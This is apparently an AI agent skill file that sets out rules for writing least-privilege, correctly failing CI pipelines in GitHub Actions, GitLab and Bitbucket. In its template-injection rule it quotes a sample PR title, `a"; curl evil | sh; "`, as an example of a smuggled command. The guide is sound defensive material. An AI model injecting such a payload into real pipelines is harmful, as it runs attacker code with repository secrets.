---
name: write-ci-workflow
description: >-
  Writes and fixes CI pipelines in GitHub Actions, GitLab CI, and Bitbucket Pipelines,
  with triggers, matrices, pinned actions, token permissions, and OIDC deploys.
  Use when a pipeline changes, a check is stuck pending,
  a job is green although tests failed, or zizmor flags it.
  Not for secret scans.
---

# Write CI Workflow

Change a pipeline so it runs the intended commit with the least privilege, its required checks fail
when their jobs fail, and deploys ship the tested artifact. The rules below are the mistakes agents
make in pipeline YAML.

## Rules

- Do not check out PR code in a job that has secrets or a write token: `pull_request_target`,
  `workflow_run`, or a protected-variable job. Run `zizmor .github/workflows` and justify every
  `dangerous-triggers` finding. Use `pull_request` to build or test a fork PR, because forks get no
  secrets there.
- Never put `${{ }}` with event data inside `run:`. Pass it through `env:` and quote `"$VAR"`: a PR
  title such as `a"; curl evil | sh; "` runs as code otherwise. `actionlint` and zizmor
  `template-injection` catch this.
- Pin third-party actions and reusable workflows to a full 40-hex SHA with a `# vX.Y.Z` comment,
  because tags can be moved. Check with zizmor (`unpinned-uses`, `ref-version-mismatch`); resolve a
  tag with `gh api repos/OWNER/REPO/commits/TAG --jq .sha`. Local `./` actions and
  `docker://...@sha256:` digests are fine.
- Set `permissions: contents: read` at workflow level and raise scopes only on the job that needs
  them. Specifying any permission sets every unlisted scope to `none`. Put `id-token: write` only on
  the deploy job, and restrict the repo, ref or environment, and audience in the cloud trust policy;
  the permission alone restricts nothing.
- Set `persist-credentials: false` on `actions/checkout` in jobs that do not push, so later steps
  and uploaded artifacts cannot read the token (zizmor `artipacked`).
- Do not add `paths` or `branches` filters to a workflow that provides a required check: a
  filtered-out workflow never reports and the check stays pending. Add `merge_group:` if a merge
  queue is used.
- On Linux and macOS runners, a `run:` with a pipe needs `shell: bash` or `set -o pipefail`. Without
  `shell:`, GitHub runs `bash -e {0}` and `test | tee log` exits 0 when `test` fails. `shell: sh`
  has the same flaw. Windows runners default to `pwsh`, which fails only on the last command's exit
  code; read environment variables through PowerShell's `env:` drive there.
- Do not use `continue-on-error`, `|| true`, or GitLab `allow_failure: true` on a required check.
- For many matrix legs or conditional jobs, require one aggregator job with `needs: [...]` and
  `if: ${{ always() }}`. Fail it unless each `needs.X.result` is `success`, or `skipped` where a
  skip is intended. `cancelled` and `failure` must fail it; a skipped aggregator counts as passing
  for branch protection.
- Key caches on everything that changes the content: OS, architecture, tool version, and lockfile
  hash (`hashFiles('**/package-lock.json')`). Never let a privileged job restore a cache written by
  an untrusted run. Measure that downloads dominate before adding one, because a cache never
  replaces a check.
- Use `concurrency: group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}` with
  `cancel-in-progress` only for PR runs. Never cancel a deploy or migration midway: use
  `cancel-in-progress: false` there.
- Set `timeout-minutes` on every job (default 360) and `fail-fast: false` on matrices whose legs are
  each useful.
- Build once and deploy the same artifact by digest. Never rebuild for production. Record the source
  SHA and producing run with it.
- `upload-artifact` v4+: names are unique per run, so matrix legs need distinct names. Set
  `if-no-files-found: error`; the default `warn` hands the next job nothing. GitHub Enterprise
  Server does not support v4+ artifact actions, so ask for its version.
- Reproduce a failing build or test step locally with the runner's shell flags, image, and
  directory; never rerun deploy, publish, or migration steps.

## Scripts

No bundled scripts. Lint every GitHub change with `actionlint` and `zizmor .github/workflows`. For
GitLab and Bitbucket use `check-jsonschema --builtin-schema vendor.gitlab-ci FILE` or
`vendor.bitbucket-pipelines FILE`. The Bitbucket schema accepts a step with `scripts:` instead of
`script:`, so read the file too.

Linters cannot show secrets, approvals, required checks, runner availability, or cloud trust. List
those as not verified.

## References

- Read [GitHub Actions](references/github-actions.md) when writing the event triggers,
  `pull_request_target`, OIDC deploy, or aggregator YAML.
- Read [GitLab and Bitbucket](references/gitlab-and-bitbucket.md) when the pipeline is
  `.gitlab-ci.yml` or `bitbucket-pipelines.yml`.
